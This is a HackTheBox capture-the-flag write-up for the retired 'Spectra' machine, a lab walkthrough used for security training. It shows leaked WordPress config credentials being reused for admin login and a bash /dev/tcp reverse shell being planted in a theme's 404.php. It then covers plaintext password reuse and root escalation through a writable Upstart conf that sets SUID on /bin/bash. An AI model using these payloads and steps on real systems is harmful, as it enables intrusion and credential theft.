# HackTheBox — Spectra

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux (ChromeOS-like)  
**Category:** Web Exploitation / WordPress / sudo initctl  
**Status:** Retired  

---

## Summary

Spectra runs a WordPress site alongside a test directory containing a PHP config file with credentials readable without auth. Those credentials log into WordPress admin, allowing theme editor RCE. Privilege escalation abuses a sudo rule for `initctl`, which manages Upstart services in a writable configuration directory.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/spectra 10.10.10.229
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1
80/tcp   open  http    nginx 1.17.4
3306/tcp open  mysql   MySQL (unauthorized)
8081/tcp open  http    nginx 1.17.4
```

Add to `/etc/hosts`:

```
10.10.10.229  spectra.htb
```

---

## Web Enumeration

The main page at `http://spectra.htb` has two links:
- `http://spectra.htb/main/` — WordPress site
- `http://spectra.htb/testing/` — "Test"

### /testing/ Directory

Visiting `http://spectra.htb/testing/` shows directory listing. Among the files:

```
wp-config.php
wp-config.php.save   ← not parsed as PHP, readable as text!
```

Reading `wp-config.php.save`:

```php
define('DB_NAME', 'dev');
define('DB_USER', 'devtest');
define('DB_PASSWORD', 'devteam01');
define('DB_HOST', 'localhost');
```

Also check for the admin username in the WordPress site — the post author is **administrator**.

---

## Exploitation

### WordPress Login

Try `administrator:devteam01` at `http://spectra.htb/main/wp-login.php` — **success**.

### Theme Editor RCE

1. Navigate to: **Appearance → Theme Editor → Select: Twenty Nineteen → 404.php**
2. Replace content with a PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'");
?>
```

3. Click "Update File"
4. Trigger it:

```bash
curl http://spectra.htb/main/?p=404
```

Shell as **nginx** / web user.

---

## Lateral Movement

### Found Autologin Password

```bash
find / -name "autologin.conf*" 2>/dev/null
cat /etc/autologin/passwd
```

```
SummerHereWeCome!!
```

Try against users found in `/etc/passwd`:

```bash
ssh katie@10.10.10.229
# Password: SummerHereWeCome!!
```

---

## User Flag

```bash
cat /home/katie/user.txt
```

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
(ALL) NOPASSWD: /sbin/initctl
```

`initctl` manages Upstart services. Check writable service configs:

```bash
ls -la /etc/init/
```

Several `.conf` files are writable by katie (or group `developers`).

Find one katie owns or is in a writable group:

```bash
ls -la /etc/init/ | grep katie
# test*.conf files writable
```

### Exploit via Upstart Service

Edit a writable service config (e.g., `test.conf`):

```bash
cat > /etc/init/test.conf << 'EOF'
description "Test"
start on filesystem

script
    chmod +s /bin/bash
end script
EOF
```

Start the service:

```bash
sudo /sbin/initctl start test
```

Then:

```bash
/bin/bash -p
whoami
# root
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- Backup config files (`.save`, `.bak`, `.old`) are often readable when the original is server-executed
- WordPress credential reuse between database and admin login is extremely common
- **Autologin config files** on ChromeOS/kiosk Linux systems store plaintext passwords
- `initctl` with writable Upstart `.conf` files is a clean privilege escalation path
- Always check `/etc/init/` directory permissions when `initctl` appears in sudo rules

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| Browser | WordPress exploitation |
| curl | Shell trigger |
| ssh | Lateral movement |
| initctl | Privilege escalation |
